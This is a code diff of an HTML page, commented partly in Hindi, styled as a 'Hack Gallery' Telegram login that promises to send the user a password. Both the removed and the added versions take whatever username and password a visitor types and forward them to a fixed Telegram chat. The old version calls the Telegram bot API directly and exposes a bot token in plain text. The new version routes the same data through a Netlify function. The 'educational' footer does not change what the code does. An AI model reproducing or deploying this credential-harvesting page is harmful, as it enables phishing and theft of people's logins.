@@ -1,208 +1,374 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Telegram Login Test</title>
+    <title>Telegram Login - Get Password on Hack Gallery Bot</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
-            background: #f0f2f5;
         }
         .container {
-            max-width: 500px;
-            margin: 0 auto;
             background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 20px;
+            padding: 35px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
         }
         h2 {
-            color: #333;
             text-align: center;
+            color: #2c3e50;
+            margin-bottom: 8px;
+            font-size: 28px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #7f8c8d;
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+        .input-group {
+            margin-bottom: 25px;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #34495e;
+            font-weight: 600;
+            font-size: 15px;
         }
         input {
             width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+            padding: 16px;
+            border: 2px solid #dfe6e9;
+            border-radius: 10px;
             font-size: 16px;
+            transition: all 0.3s;
+            background: #f8f9fa;
+        }
+        input:focus {
+            outline: none;
+            border-color: #3498db;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(52, 152, 219, 0.1);
         }
         button {
             width: 100%;
+            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 19px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 15px;
+            letter-spacing: 0.5px;
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+            background: linear-gradient(135deg, #2980b9 0%, #1a252f 100%);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        .telegram-link {
+            display: block;
+            text-align: center;
             background: #0088cc;
             color: white;
-            padding: 15px;
-            border: none;
-            border-radius: 5px;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 10px 0;
+            text-decoration: none;
+            padding: 16px;
+            border-radius: 10px;
+            margin: 30px 0 20px;
+            font-weight: 700;
+            font-size: 17px;
+            transition: all 0.3s;
         }
-        .result {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 5px;
+        .telegram-link:hover {
+            background: #0077b3;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 16px rgba(0, 136, 204, 0.2);
+        }
+        #result {
+            margin-top: 25px;
+            padding: 18px;
+            border-radius: 10px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 16px;
             display: none;
+            line-height: 1.5;
         }
         .success {
-            background: #d4edda;
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
             color: #155724;
-            border: 1px solid #c3e6cb;
+            border: 2px solid #b1dfbb;
             display: block;
         }
         .error {
-            background: #f8d7da;
+            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
             color: #721c24;
-            border: 1px solid #f5c6cb;
+            border: 2px solid #f1b0b7;
             display: block;
         }
-        .test-btn {
-            background: #28a745;
+        .loading {
+            background: linear-gradient(135deg, #e2e3e5 0%, #d6d8db 100%);
+            color: #383d41;
+            border: 2px solid #c8cbcf;
+            display: block;
+        }
+        .credentials-box {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-left: 5px solid #00b894;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .credentials-box p {
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+        }
+        .credentials-box .icon {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        .test-credentials {
+            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
+            border-left: 5px solid #fdcb6e;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #636e72;
+            font-size: 13px;
+            border-top: 2px solid #f1f2f6;
+            padding-top: 20px;
+        }
+        .bot-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px dashed #3498db;
+        }
+        .bot-icon {
+            background: #3498db;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-size: 20px;
+            box-shadow: 0 4px 8px rgba(52, 152, 219, 0.3);
+        }
+        .bot-details {
+            text-align: left;
+        }
+        .bot-name {
+            font-weight: 700;
+            color: #2c3e50;
+            font-size: 18px;
+        }
+        .bot-username {
+            color: #3498db;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        .highlight {
+            background: #ffeaa7;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            color: #d63031;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🔐 Telegram Bot Test</h2>
-        <p style="text-align:center;color:#666;">Using your actual Bot Token & Chat ID</p>
+        <h2>🔐 Hack Gallery Login System</h2>
+        <p class="subtitle">Login to receive password on Telegram Bot</p>
         
-        <input type="text" id="username" placeholder="Enter Username" value="test_user">
-        <input type="password" id="password" placeholder="Enter Password" value="test123">
+        <div class="bot-info">
+            <div class="bot-icon">🤖</div>
+            <div class="bot-details">
+                <div class="bot-name">Hack Gallery Bot</div>
+                <div class="bot-username">@hackkgalerybot</div>
+                <div style="font-size:12px;color:#7f8c8d;margin-top:5px;">Status: ✅ Active & Connected</div>
+            </div>
+        </div>
         
-        <button onclick="login()">📲 Send to Telegram Bot</button>
+        <div class="test-credentials">
+            <strong>🎯 Test Login Credentials:</strong><br>
+            👤 Username: <span class="highlight">hack_student</span><br>
+            🔑 Password: <span class="highlight">hack@2024</span>
+        </div>
         
-        <button class="test-btn" onclick="testAPI()">🔧 Test Telegram API</button>
+        <div class="input-group">
+            <label for="username">👤 Enter Username:</label>
+            <input type="text" id="username" placeholder="Type your username here" value="hack_student">
+        </div>
+        
+        <div class="input-group">
+            <label for="password">🔑 Enter Password:</label>
+            <input type="password" id="password" placeholder="Type your password here" value="hack@2024">
+        </div>
+        
+        <button onclick="login()">
+            🔓 Login & Get Password on Telegram
+        </button>
+        
+        <a href="https://t.me/hackkgalerybot" target="_blank" class="telegram-link">
+            🤖 Open @hackkgalerybot on Telegram
+        </a>
         
         <div id="result"></div>
         
-        <div style="margin-top:30px;padding:15px;background:#e7f3ff;border-radius:5px;">
-            <h4>📋 Debug Info:</h4>
-            <p><strong>Bot Token:</strong> 8360063981:AAGBPsQmcXsg5fk1nQQMMiapLsdwwDdzito</p>
-            <p><strong>Chat ID:</strong> 5614775725</p>
-            <p><strong>Bot Username:</strong> @_______ (आपका बॉट username)</p>
+        <div class="credentials-box">
+            <p><span class="icon">📊</span> <strong>System Configuration:</strong></p>
+            <p><span class="icon">✅</span> Telegram Bot: <strong>@hackkgalerybot</strong></p>
+            <p><span class="icon">✅</span> Chat ID: <code>5614775725</code></p>
+            <p><span class="icon">✅</span> Bot Token: Configured in Backend</p>
+            <p><span class="icon">✅</span> Netlify Functions: Active</p>
+            <p><span class="icon">✅</span> HTTPS: Enabled</p>
+        </div>
+        
+        <div class="footer">
+            <p>🎓 <strong>Educational Purpose Only</strong> - This is a demo system</p>
+            <p>🔧 Powered by Netlify Functions + Telegram Bot API</p>
+            <p style="font-size:12px;margin-top:15px;color:#b2bec3;">
+                📱 Telegram Bot: @hackkgalerybot | Chat ID: 5614775725
+            </p>
         </div>
     </div>
 
     <script>
-        // 🔴 YOUR ACTUAL CREDENTIALS
-        const BOT_TOKEN = '8360063981:AAGBPsQmcXsg5fk1nQQMMiapLsdwwDdzito';
-        const CHAT_ID = '5614775725';
+        // ✅ आपका Telegram Bot Data
+        const YOUR_CHAT_ID = '5614775725';  // आपका Chat ID
+        const YOUR_BOT_USERNAME = '@hackkgalerybot'; // ✅ आपका Bot Username
         
         async function login() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
             const resultDiv = document.getElementById('result');
             
-            resultDiv.className = 'result';
-            resultDiv.innerHTML = '⏳ Sending...';
+            // Validation
+            if(!username || !password) {
+                showResult('⚠️ Please enter both username and password', 'error');
+                return;
+            }
+            
+            // Show loading
+            showResult('⏳ Connecting to @hackkgalerybot...', 'loading');
             
             try {
-                // Create message
-                const message = `🔔 <b>NEW LOGIN</b>\n\n` +
-                              `👤 <b>Username:</b> ${username}\n` +
-                              `🔑 <b>Password:</b> ${password}\n` +
-                              `🕒 <b>Time:</b> ${new Date().toLocaleString('en-IN')}\n` +
-                              `🌐 <b>From:</b> Netlify App`;
-                
-                // Send to Telegram
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                // Call Netlify Function
+                const response = await fetch('/.netlify/functions/telegram', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
+                        username: username,
+                        password: password,
+                        chat_id: YOUR_CHAT_ID,
+                        bot_username: YOUR_BOT_USERNAME,
+                        timestamp: new Date().toISOString(),
+                        source: 'Hack Gallery Login System'
                     })
                 });
                 
                 const data = await response.json();
-                console.log('Telegram Response:', data);
+                console.log('Server Response:', data);
                 
-                if(data.ok) {
-                    resultDiv.innerHTML = `✅ Success! Check Telegram bot`;
-                    resultDiv.className = 'result success';
+                if(data.success) {
+                    showResult(`✅ Password sent successfully!<br><br>📲 Check your Telegram bot:<br><strong>${YOUR_BOT_USERNAME}</strong>`, 'success');
                     
-                    // Send password in separate message
+                    // Auto-clear form after 3 seconds
                     setTimeout(() => {
-                        const passwordMsg = `🔐 <b>YOUR PASSWORD</b>\n\n` +
-                                          `For user: <code>${username}</code>\n` +
-                                          `Password: <code>EDU${Date.now().toString().slice(-6)}</code>\n\n` +
-                                          `<i>Educational purpose only</i>`;
-                        
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                chat_id: CHAT_ID,
-                                text: passwordMsg,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                    }, 1000);
+                        document.getElementById('username').value = '';
+                        document.getElementById('password').value = '';
+                        document.getElementById('username').focus();
+                    }, 3000);
+                    
+                    // Auto-scroll to result
+                    resultDiv.scrollIntoView({ behavior: 'smooth' });
                     
                 } else {
-                    resultDiv.innerHTML = `❌ Failed: ${data.description || 'Unknown error'}`;
-                    resultDiv.className = 'result error';
+                    showResult(`❌ Error: ${data.error || 'Please try again'}`, 'error');
                 }
                 
             } catch(error) {
-                resultDiv.innerHTML = `❌ Network Error: ${error.message}`;
-                resultDiv.className = 'result error';
+                console.error('Login error:', error);
+                showResult('❌ Connection failed. Check internet and try again.', 'error');
             }
         }
         
-        async function testAPI() {
+        function showResult(message, type) {
             const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = '⏳ Testing API...';
-            
-            try {
-                // Test 1: Check bot token
-                const test1 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-                const botInfo = await test1.json();
-                
-                let html = `<h3>API Test Results:</h3>`;
-                html += `<p><strong>Bot Token Valid:</strong> ${botInfo.ok ? '✅ YES' : '❌ NO'}</p>`;
-                
-                if(botInfo.ok) {
-                    html += `<p><strong>Bot Name:</strong> ${botInfo.result.first_name}</p>`;
-                    html += `<p><strong>Bot Username:</strong> @${botInfo.result.username}</p>`;
-                }
-                
-                // Test 2: Send test message
-                const test2 = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: '🤖 API Test Successful!',
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                const msgResult = await test2.json();
-                html += `<p><strong>Message Sent:</strong> ${msgResult.ok ? '✅ YES' : '❌ NO'}</p>`;
-                
-                if(!msgResult.ok) {
-                    html += `<p><strong>Error:</strong> ${msgResult.description}</p>`;
-                }
-                
-                resultDiv.innerHTML = html;
-                resultDiv.className = 'result';
-                
-            } catch(error) {
-                resultDiv.innerHTML = `❌ Test Failed: ${error}`;
-                resultDiv.className = 'result error';
-            }
+            resultDiv.innerHTML = message;
+            resultDiv.className = type;
         }
         
-        // Auto-test on page load
-        window.onload = function() {
-            setTimeout(testAPI, 1000);
-        };
+        // Enter key support
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if(e.key === 'Enter') {
+                login();
+            }
+        });
+        
+        // Auto-focus on username
+        document.getElementById('username').focus();
+        
+        // Add click animation to button
+        document.querySelector('button').addEventListener('click', function() {
+            this.style.transform = 'scale(0.98)';
+            setTimeout(() => {
+                this.style.transform = '';
+            }, 150);
+        });
+        
+        // Real-time input validation
+        document.getElementById('username').addEventListener('input', function() {
+            if(this.value.length > 0) {
+                this.style.borderColor = '#00b894';
+            } else {
+                this.style.borderColor = '#dfe6e9';
+            }
+        });
+        
+        document.getElementById('password').addEventListener('input', function() {
+            if(this.value.length > 0) {
+                this.style.borderColor = '#00b894';
+            } else {
+                this.style.borderColor = '#dfe6e9';
+            }
+        });
     </script>
 </body>
 </html>
